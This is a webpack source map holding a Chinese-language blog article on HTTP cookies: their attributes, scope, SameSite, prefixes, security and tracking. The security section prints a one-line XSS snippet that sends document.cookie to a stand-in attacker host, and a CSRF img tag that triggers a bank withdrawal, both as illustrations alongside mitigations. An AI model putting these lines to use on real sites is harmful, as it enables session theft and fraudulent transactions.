{"version":3,"file":"component---src-pages-http-cookies-mdx-b79fe13dad9e234d99d4.js","mappings":"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","sources":["webpack://blog/./src/pages/http/cookies.mdx"],"sourcesContent":["import * as React from 'react'\n  /* @jsx mdx */\nimport { mdx } from '@mdx-js/react';\n/* @jsxRuntime classic */\n\n/* @jsx mdx */\n\nexport const _frontmatter = {\n  \"title\": \"HTTP Cookie\",\n  \"slug\": \"/http/cookies\",\n  \"tags\": [\"http\"]\n};\nconst layoutProps = {\n  _frontmatter\n};\nconst MDXLayout = \"wrapper\";\nexport default function MDXContent({\n  components,\n  ...props\n}) {\n  return <MDXLayout {...layoutProps} {...props} components={components} mdxType=\"MDXLayout\">\n    <p>{`HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。`}</p>\n    <p>{`Cookie 主要用于以下三个方面：`}</p>\n    <ul>\n      <li parentName=\"ul\">{`会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）`}</li>\n      <li parentName=\"ul\">{`个性化设置（如用户自定义设置、主题等）`}</li>\n      <li parentName=\"ul\">{`浏览器行为跟踪（如跟踪分析用户行为等）`}</li>\n    </ul>\n    <p>{`Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。`}</p>\n    <blockquote>\n      <p parentName=\"blockquote\"><strong parentName=\"p\">{`备注：`}</strong>{` 要查看 Cookie 存储（或网页上能够使用其他的存储方式），你可以在开发者工具中启用`}<strong parentName=\"p\">{`存储查看`}</strong>{`（Storage Inspector ）功能，并在存储树上选中`}<strong parentName=\"p\">{`Cookie`}</strong>{`。`}</p>\n    </blockquote>\n    <h2>{`创建 Cookie`}</h2>\n    <p>{`当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 \"Set-Cookie\" 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 (\"Cookie\") 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。`}</p>\n    <h3><inlineCode parentName=\"h3\">{`Set-Cookie 响应头部`}</inlineCode>{`和`}<inlineCode parentName=\"h3\">{`Cookie 请求头部`}</inlineCode></h3>\n    <p>{`服务器使用 (\"Set-Cookie\") 响应头部向用户代理（一般是浏览器）发送 Cookie 信息。一个简单的 Cookie 可能像这样：`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-plain\"\n      }}>{`Set-Cookie: <cookie 名>=<cookie 值>\n`}</code></pre>\n    <p>{`服务器通过该头部告知客户端保存 Cookie 信息。`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-plain\"\n      }}>{`HTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n\n[页面内容]\n`}</code></pre>\n    <p>{`现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的 Cookie 信息通过 (\"Cookie\") 请求头部再发送给服务器。`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-plain\"\n      }}>{`GET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n`}</code></pre>\n    <blockquote>\n      <p parentName=\"blockquote\"><strong parentName=\"p\">{`备注：`}</strong>{` 如何在以下几种服务端程序中设置 `}<inlineCode parentName=\"p\">{`Set-Cookie`}</inlineCode>{` 响应头信息：`}</p>\n      <ul parentName=\"blockquote\">\n        <li parentName=\"ul\"><a parentName=\"li\" {...{\n            \"href\": \"https://secure.php.net/manual/en/function.setcookie.php\"\n          }}>{`PHP`}</a></li>\n        <li parentName=\"ul\"><a parentName=\"li\" {...{\n            \"href\": \"https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value\"\n          }}>{`Node.JS`}</a></li>\n        <li parentName=\"ul\"><a parentName=\"li\" {...{\n            \"href\": \"https://docs.python.org/3/library/http.cookies.html\"\n          }}>{`Python`}</a></li>\n        <li parentName=\"ul\"><a parentName=\"li\" {...{\n            \"href\": \"https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html\"\n          }}>{`Ruby on Rails`}</a></li>\n      </ul>\n    </blockquote>\n    <h3>{`定义 Cookie 的生命周期`}</h3>\n    <p>{`Cookie 的生命周期可以通过两种方式定义：`}</p>\n    <ul>\n      <li parentName=\"ul\">{`会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（`}<inlineCode parentName=\"li\">{`Expires`}</inlineCode>{`）或者有效期（`}<inlineCode parentName=\"li\">{`Max-Age`}</inlineCode>{`）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。`}</li>\n      <li parentName=\"ul\">{`持久性 Cookie 的生命周期取决于过期时间（`}<inlineCode parentName=\"li\">{`Expires`}</inlineCode>{`）或有效期（`}<inlineCode parentName=\"li\">{`Max-Age`}</inlineCode>{`）指定的一段时间。`}</li>\n    </ul>\n    <p>{`例如：`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-plain\"\n      }}>{`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n`}</code></pre>\n    <blockquote>\n      <p parentName=\"blockquote\"><strong parentName=\"p\">{`备注：`}</strong>{` 当 Cookie 的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。`}</p>\n    </blockquote>\n    <p>{`如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止会话固定攻击（session fixation attacks），在该攻击中第三方可以重用用户的会话。`}</p>\n    <h3>{`限制访问 Cookie`}</h3>\n    <p>{`有两种方法可以确保 `}<inlineCode parentName=\"p\">{`Cookie`}</inlineCode>{` 被安全发送，并且不会被意外的参与者或脚本访问：`}<inlineCode parentName=\"p\">{`Secure`}</inlineCode>{` 属性和`}<inlineCode parentName=\"p\">{`HttpOnly`}</inlineCode>{` 属性。`}</p>\n    <p>{`标记为 `}<inlineCode parentName=\"p\">{`Secure`}</inlineCode>{` 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 \"man-in-the-middle\" 攻击者的攻击。但即便设置了 `}<inlineCode parentName=\"p\">{`Secure`}</inlineCode>{` 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，`}<inlineCode parentName=\"p\">{`Secure`}</inlineCode>{` 标记也无法提供确实的安全保障，例如，可以访问客户端硬盘的人可以读取它。`}</p>\n    <blockquote>\n      <p parentName=\"blockquote\"><strong parentName=\"p\">{`备注：`}</strong>{` 从 Chrome 52 和 Firefox 52 开始，不安全的站点（`}<inlineCode parentName=\"p\">{`http:`}</inlineCode>{`）无法使用 Cookie 的 `}<inlineCode parentName=\"p\">{`Secure`}</inlineCode>{` 标记。`}</p>\n    </blockquote>\n    <p>{`JavaScript \"Document.cookie\" API 无法访问带有 `}<inlineCode parentName=\"p\">{`HttpOnly`}</inlineCode>{` 属性的 cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 `}<inlineCode parentName=\"p\">{`HttpOnly`}</inlineCode>{` 属性。此预防措施有助于缓解跨站点脚本（XSS）攻击。`}</p>\n    <p>{`示例：`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-plain\"\n      }}>{`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n`}</code></pre>\n    <h3>{`Cookie 的作用域`}</h3>\n    <p><inlineCode parentName=\"p\">{`Domain`}</inlineCode>{` 和 `}<inlineCode parentName=\"p\">{`Path`}</inlineCode>{` 标识定义了 Cookie 的`}<em parentName=\"p\">{`作用域：`}</em>{`即允许 Cookie 应该发送给哪些 URL。`}</p>\n    <h4>{`Domain 属性`}</h4>\n    <p><inlineCode parentName=\"p\">{`Domain`}</inlineCode>{` 指定了哪些主机可以接受 Cookie。如果不指定，默认为 (\"origin\")，`}<strong parentName=\"p\">{`不包含子域名`}</strong>{`。如果指定了`}<inlineCode parentName=\"p\">{`Domain`}</inlineCode>{`，则一般包含子域名。因此，指定 `}<inlineCode parentName=\"p\">{`Domain`}</inlineCode>{` 比省略它的限制要少。但是，当子域需要共享有关用户的信息时，这可能会有所帮助。`}</p>\n    <p>{`例如，如果设置 `}<inlineCode parentName=\"p\">{`Domain=mozilla.org`}</inlineCode>{`，则 Cookie 也包含在子域名中（如`}<inlineCode parentName=\"p\">{`developer.mozilla.org`}</inlineCode>{`）。`}</p>\n    <blockquote>\n      <p parentName=\"blockquote\"><strong parentName=\"p\">{`备注：`}</strong>{` 当前大多数浏览器遵循 `}<a parentName=\"p\" {...{\n          \"href\": \"http://tools.ietf.org/html/rfc6265\"\n        }}>{`RFC 6265`}</a>{`，设置 Domain 时 不需要加前导点。浏览器不遵循该规范，则需要加前导点，例如：`}<inlineCode parentName=\"p\">{`Domain=.mozilla.org`}</inlineCode></p>\n    </blockquote>\n    <h4>{`Path 属性`}</h4>\n    <p><inlineCode parentName=\"p\">{`Path`}</inlineCode>{` 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 `}<inlineCode parentName=\"p\">{`%x2F`}</inlineCode>{` (\"/\") 作为路径分隔符，子路径也会被匹配。`}</p>\n    <p>{`例如，设置 `}<inlineCode parentName=\"p\">{`Path=/docs`}</inlineCode>{`，则以下地址都会匹配：`}</p>\n    <ul>\n      <li parentName=\"ul\"><inlineCode parentName=\"li\">{`/docs`}</inlineCode></li>\n      <li parentName=\"ul\"><inlineCode parentName=\"li\">{`/docs/Web/`}</inlineCode></li>\n      <li parentName=\"ul\"><inlineCode parentName=\"li\">{`/docs/Web/HTTP`}</inlineCode></li>\n    </ul>\n    <h4>{`SameSite attribute`}</h4>\n    <p><inlineCode parentName=\"p\">{`SameSite`}</inlineCode>{` Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，（其中 (\"Site\") 由可注册域定义），从而可以阻止跨站请求伪造攻击(\"CSRF\")。`}</p>\n    <p>{`SameSite cookies 是相对较新的一个字段，所有主流浏览器都已经得到支持。`}</p>\n    <p>{`下面是例子：`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-js\"\n      }}>{`Set-Cookie: key=value; SameSite=Strict\n`}</code></pre>\n    <p>{`SameSite 可以有下面三种值：`}</p>\n    <ul>\n      <li parentName=\"ul\"><strong parentName=\"li\"><inlineCode parentName=\"strong\">{`None`}</inlineCode></strong>{`。浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写。`}</li>\n      <li parentName=\"ul\"><strong parentName=\"li\"><inlineCode parentName=\"strong\">{`Strict`}</inlineCode></strong>{`。浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）`}</li>\n      <li parentName=\"ul\"><strong parentName=\"li\"><inlineCode parentName=\"strong\">{`Lax`}</inlineCode></strong>{`。与 `}<strong parentName=\"li\"><inlineCode parentName=\"strong\">{`Strict`}</inlineCode></strong>{` 类似，但用户从外部站点导航至 URL 时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到 URL 时才会发送。如 link 链接`}</li>\n    </ul>\n    <blockquote>\n      <p parentName=\"blockquote\"><strong parentName=\"p\">{`备注：`}</strong>{` 以前，如果 SameSite 属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于 None，Cookies 会被包含在任何请求中——包括跨站请求。大多数主流浏览器正在将 `}<a parentName=\"p\" {...{\n          \"href\": \"https://www.chromestatus.com/feature/5088147346030592\"\n        }}>{`SameSite 的默认值迁移至 Lax`}</a>{`。如果想要指定 Cookies 在同站、跨站请求都被发送，现在需要明确指定 SameSite 为 None。`}</p>\n    </blockquote>\n    <h4>{`Cookie prefixes`}</h4>\n    <p>{`cookie 的机制使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。`}</p>\n    <p>{`子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。有关主要缓解方法，请参阅会话劫持（ session fixation）。`}</p>\n    <p>{`但是，作为`}<a parentName=\"p\" {...{\n        \"href\": \"https://en.wikipedia.org/wiki/Defense_in_depth_(computing)\"\n      }}>{`深度防御措施`}</a>{`，可以使用 cookie 前缀来断言有关 cookie 的特定事实。有两个前缀可用：`}</p>\n    <ul>\n      <li parentName=\"ul\"><inlineCode parentName=\"li\">{`__Host-`}</inlineCode>\n        <ul parentName=\"li\">\n          <li parentName=\"ul\">{`: 如果 cookie 名称具有此前缀，则仅当它也用 `}<inlineCode parentName=\"li\">{`Secure`}</inlineCode>{` 属性标记，是从安全来源发送的，不包括 `}<inlineCode parentName=\"li\">{`Domain`}</inlineCode>{` 属性，并将 `}<inlineCode parentName=\"li\">{`Path`}</inlineCode>{` 属性设置为 `}<inlineCode parentName=\"li\">{`/`}</inlineCode>{` 时，它才在 (\"Set-Cookie\") 标头中接受。这样，这些 cookie 可以被视为 \"domain-locked”。`}</li>\n        </ul>\n      </li>\n      <li parentName=\"ul\"><inlineCode parentName=\"li\">{`__Secure-`}</inlineCode>\n        <ul parentName=\"li\">\n          <li parentName=\"ul\">{`: 如果 cookie 名称具有此前缀，则仅当它也用 `}<inlineCode parentName=\"li\">{`Secure`}</inlineCode>{` 属性标记，是从安全来源发送的，它才在 (\"Set-Cookie\") 标头中接受。该前缀限制要弱于 `}<inlineCode parentName=\"li\">{`__Host-`}</inlineCode>{` 前缀。`}</li>\n        </ul>\n      </li>\n    </ul>\n    <p>{`带有这些前缀点 Cookie， 如果不符合其限制的会被浏览器拒绝。请注意，这确保了如果子域要创建带有前缀的 cookie，那么它将要么局限于该子域，要么被完全忽略。由于应用服务器仅在确定用户是否已通过身份验证或 CSRF 令牌正确时才检查特定的 cookie 名称，因此，这有效地充当了针对会话劫持的防御措施。`}</p>\n    <blockquote>\n      <p parentName=\"blockquote\"><strong parentName=\"p\">{`备注：`}</strong>{` 在应用程序服务器上，Web 应用程序`}<strong parentName=\"p\">{`必须`}</strong>{`检查完整的 cookie 名称，包括前缀 —— 用户代理程序在从请求的 (\"Cookie\") 标头中发送前缀之前，`}<strong parentName=\"p\">{`不会`}</strong>{`从 cookie 中剥离前缀。`}</p>\n    </blockquote>\n    <h4>{`JavaScript 通过 Document.cookie 访问 Cookie`}</h4>\n    <p>{`通过 (\"Document.cookie\") 属性可创建新的 Cookie，也可通过该属性访问非`}<inlineCode parentName=\"p\">{`HttpOnly`}</inlineCode>{`标记的 Cookie。`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-js\"\n      }}>{`document.cookie = 'yummy_cookie=choco';\ndocument.cookie = 'tasty_cookie=strawberry';\nconsole.log(document.cookie);\n// logs \"yummy_cookie=choco; tasty_cookie=strawberry\"\n`}</code></pre>\n    <p>{`通过 JavaScript 创建的 Cookie 不能包含 HttpOnly 标志。`}</p>\n    <p>{`请留意在安全章节提到的安全隐患问题，JavaScript 可以通过跨站脚本攻击（XSS）的方式来窃取 Cookie。`}</p>\n    <h2>{`安全`}</h2>\n    <blockquote>\n      <p parentName=\"blockquote\"><strong parentName=\"p\">{`备注：`}</strong>{` 信息被存在 Cookie 中时，需要明白 cookie 的值是可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。当机器处于不安全环境时，切记`}<em parentName=\"p\">{`不能`}</em>{`通过 HTTP Cookie 存储、传输敏感信息。`}</p>\n    </blockquote>\n    <p>{`缓解涉及 Cookie 的攻击的方法：`}</p>\n    <ul>\n      <li parentName=\"ul\">{`使用 `}<inlineCode parentName=\"li\">{`HttpOnly`}</inlineCode>{` 属性可防止通过 JavaScript 访问 cookie 值。`}</li>\n      <li parentName=\"ul\">{`用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 `}<inlineCode parentName=\"li\">{`SameSite`}</inlineCode>{` 属性设置为`}<inlineCode parentName=\"li\">{`Strict`}</inlineCode>{` 或 `}<inlineCode parentName=\"li\">{`Lax`}</inlineCode>{`。（请参见上方的 SameSite Cookie。）在支持 SameSite 的浏览器中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。`}</li>\n    </ul>\n    <h3>{`会话劫持和 XSS`}</h3>\n    <p>{`在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 (\"XSS\") 攻击。`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-js\"\n      }}>{`new Image().src =\n  'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;\n`}</code></pre>\n    <p><inlineCode parentName=\"p\">{`HttpOnly`}</inlineCode>{` 类型的 Cookie 用于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。`}</p>\n    <h3>{`跨站请求伪造（CSRF）`}</h3>\n    <p><a parentName=\"p\" {...{\n        \"href\": \"https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery\"\n      }}>{`维基百科`}</a>{`已经给了一个比较好的 (\"CSRF\") 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-html\"\n      }}>{`<img\n  src=\"http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory\"\n/>\n`}</code></pre>\n    <p>{`当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：`}</p>\n    <ul>\n      <li parentName=\"ul\">{`对用户输入进行过滤来阻止 (\"XSS\")；`}</li>\n      <li parentName=\"ul\">{`任何敏感操作都需要确认；`}</li>\n      <li parentName=\"ul\">{`用于敏感信息的 Cookie 只能拥有较短的生命周期；`}</li>\n      <li parentName=\"ul\">{`更多方法可以查看`}<a parentName=\"li\" {...{\n          \"href\": \"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet\"\n        }}>{`OWASP CSRF prevention cheat sheet`}</a>{`。`}</li>\n    </ul>\n    <h2>{`跟踪和隐私`}</h2>\n    <h3>{`第三方 Cookie`}</h3>\n    <p>{`Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为`}<em parentName=\"p\">{`第一方 cookie（ first-party cookie）`}</em>{`。如果域不同，则它是`}<em parentName=\"p\">{`第三方 cookie（third-party cookie）`}</em>{`。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，`}<a parentName=\"p\" {...{\n        \"href\": \"https://policies.google.com/technologies/types\"\n      }}>{`types of cookies used by Google`}</a>{`。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方 cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。`}</p>\n    